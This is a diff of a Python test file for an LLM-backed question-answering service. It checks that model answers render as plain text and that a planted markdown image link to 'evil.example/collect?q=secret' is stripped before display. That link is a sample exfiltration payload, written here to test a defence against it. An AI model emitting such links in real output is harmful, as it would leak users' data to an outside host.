@@ -182,13 +182,17 @@ def test_nothing_the_person_may_not_read_is_ever_shown(open_as: Open, name: str)
 
 
 def test_the_models_words_are_shown_as_plain_text_never_markdown(open_as: Open) -> None:
-    planted = "![chart](https://evil.example/collect?q=secret) and [click](https://evil.example)"
-    page = go_to_ask(open_as("david", FakeLLM([f"{planted} [S1]"])))
+    # Markdown the service leaves in an answer is shown exactly as typed.
+    planted = "**Twenty-five** _days_, `code` and <b>html</b>"
+    # A link it doesn't leave: the service takes its URL out before the UI sees it.
+    image = "![chart](https://evil.example/collect?q=secret)"
+    page = go_to_ask(open_as("david", FakeLLM([f"{planted} {image} [S1]"])))
 
     ask(page, LEAVE)
 
-    assert page.text[0].value == f"{planted} [S1]"
-    assert all("evil.example" not in m.value for m in page.markdown)
+    assert page.text[0].value == f"{planted} chart [S1]"
+    assert all("**Twenty-five**" not in m.value for m in page.markdown)
+    assert "evil.example" not in everything_shown(page)
 
 
 def test_a_source_title_with_markdown_in_it_is_shown_as_typed(open_as: Open, db: Session) -> None:
